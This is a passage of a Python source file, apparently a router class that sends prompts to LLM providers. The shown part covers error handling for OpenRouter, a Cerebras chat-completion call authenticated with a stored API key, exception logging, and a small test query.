                return f"[Error] OpenRouter failed: {resp.get('error', {}).get('message', 'No choices')}"

            elif provider == "cerebras":
                key = get_key("cerebras")
                if not key:
                    return "[Error] No Cerebras key"
                r = requests.post(
                    "https://api.cerebras.ai/v1/chat/completions",
                    headers={"Authorization": f"Bearer {key}"},
                    json={"model": "llama3.1-8b", "messages": [{"role": "user", "content": prompt}], "max_tokens": 2048},
                    timeout=30
                )
                resp = r.json()
                if "choices" in resp:
                    return resp["choices"][0]["message"]["content"]
                return f"[Error] Cerebras failed"

            # Add more providers here (Mistral, etc.)

        except Exception as e:
            import traceback
            log.error(f" [OMNI] {provider} call failed: {e}")
            log.error(traceback.format_exc())
            return f"[Error] {provider} call failed: {e}"
        return "[Error] Unknown"

if __name__ == "__main__":
    # Test
    print(OmniRouter.query("Explain the importance of autonomous AI agents.", task_type="reasoning"))
